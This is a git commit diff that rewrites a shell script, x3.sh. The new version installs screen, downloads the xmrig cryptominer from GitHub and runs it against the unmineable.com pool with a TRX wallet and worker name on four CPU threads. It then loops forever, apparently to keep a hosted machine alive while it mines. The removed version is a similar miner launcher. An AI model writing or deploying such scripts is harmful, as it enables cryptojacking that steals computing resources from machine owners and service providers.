1d7b6e0af6cc7979e76d2c2a177b0fa219559413
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-01-30 15:05:45 -0300

    Update x3.sh

--- x3.sh
+++ x3.sh
@@ -1,5 +1,11 @@
-# xmrig
-wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-x64.tar.gz
-tar -xf xmrig-6.18.1-linux-x64.tar.gz
-cd xmrig-6.18.1
-./xmrig --coin=XMR -o google.com:443 -u ADLSAKDLASKDLFJALDKASLDKADL.15direto -p x -t 2
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
+tar xf xmrig-6.14.0-linux-x64.tar.gz
+cd xmrig-6.14.0
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.miner1 -p x --cpu 4
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
